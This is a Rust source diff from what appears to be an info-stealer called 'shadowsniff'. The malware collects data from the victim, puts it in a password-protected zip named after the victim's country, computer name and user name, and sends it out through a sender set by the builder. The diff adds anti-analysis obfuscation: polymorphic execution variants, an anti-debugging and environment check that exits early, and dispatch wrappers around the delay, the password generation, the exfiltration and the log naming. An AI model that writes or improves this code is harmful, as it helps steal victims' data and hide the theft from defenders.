@@ -34,6 +34,7 @@ use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::virtualfs::VirtualFileSystem;
 use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
+use obfuscation::{init_obfuscation, control_flow::obf_dispatch, runtime_polymorphism::PolymorphicExecutor};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use sender::LogSenderExt;
@@ -43,9 +44,54 @@ use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
 use zip::ZipArchive;
 
+/// Polymorphic execution variants for the main logic
+struct MainLogicExecutor {
+    fs: VirtualFileSystem,
+    out: Path,
+    collector: AtomicCollector,
+}
+
+impl PolymorphicExecutor<()> for MainLogicExecutor {
+    fn execute_variant_a(&self) -> () {
+        SniffTask::default().run(&self.out, &self.fs, &self.collector);
+    }
+    
+    fn execute_variant_b(&self) -> () {
+        // Variant with additional noise
+        obfuscation::obf_nop();
+        SniffTask::default().run(&self.out, &self.fs, &self.collector);
+        obfuscation::obf_nop();
+    }
+    
+    fn execute_variant_c(&self) -> () {
+        // Variant with integrity check
+        if obfuscation::integrity_check() {
+            SniffTask::default().run(&self.out, &self.fs, &self.collector);
+        }
+    }
+    
+    fn execute_variant_d(&self) -> () {
+        // Complex variant
+        obfuscation::obf_nop();
+        if obfuscation::integrity_check() {
+            obfuscation::obf_nop();
+            SniffTask::default().run(&self.out, &self.fs, &self.collector);
+        }
+    }
+}
+
 #[inline(always)]
 pub fn run() {
-    include!(env!("BUILDER_START_DELAY"));
+    // Initialize obfuscation layers first
+    if !init_obfuscation() {
+        // Anti-debugging or environment check failed
+        return;
+    }
+    
+    // Obfuscated delay execution
+    obf_dispatch(|| {
+        include!(env!("BUILDER_START_DELAY"));
+    });
 
     if !init_ip_info() {
         panic!()
@@ -55,14 +101,21 @@ pub fn run() {
     include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
 
     let fs = VirtualFileSystem::default();
-    let out = &Path::new("\\output");
-    let _ = fs.mkdir(out);
+    let out = Path::new("\\output");
+    let _ = fs.mkdir(&out);
 
     let collector = AtomicCollector::default();
 
-    SniffTask::default().run(out, &fs, &collector);
+    // Execute main logic through polymorphic dispatcher
+    let executor = MainLogicExecutor {
+        fs: fs.clone(),
+        out: out.clone(), 
+        collector: collector.clone(),
+    };
+    
+    executor.execute();
 
-    let password: String = {
+    let password: String = obf_dispatch(|| {
         let charset: Vec<char> = "shadowsniff0123456789".chars().collect();
         let mut rng = ChaCha20Rng::from_nano_time();
 
@@ -72,33 +125,38 @@ pub fn run() {
                 charset[idx]
             })
             .collect()
-    };
+    });
 
     let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
 
     include!(env!("BUILDER_CONSIDER_EMPTY_EXPR"));
 
     let zip = ZipArchive::default()
-        .add_folder_content(&fs, out)
+        .add_folder_content(&fs, &out)
         .password(password)
         .comment(displayed_collector);
 
     let sender = include!(env!("BUILDER_SENDER_EXPR"));
 
-    let _ = sender.send_archive(generate_log_name(), zip, &collector);
+    let _ = obf_dispatch(|| {
+        sender.send_archive(generate_log_name(), zip, &collector)
+    });
 
     #[cfg(feature = "message_box_after_execution")]
     include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
 }
 
 fn generate_log_name() -> Arc<str> {
-    let PcInfo {
-        computer_name,
-        user_name,
-        ..
-    } = PcInfo::retrieve();
+    // Obfuscate the log name generation
+    obf_dispatch(|| {
+        let PcInfo {
+            computer_name,
+            user_name,
+            ..
+        } = PcInfo::retrieve();
 
-    let IpInfo { country, .. } = unwrapped_ip_info();
+        let IpInfo { country, .. } = unwrapped_ip_info();
 
-    format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
+        format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
+    })
 }
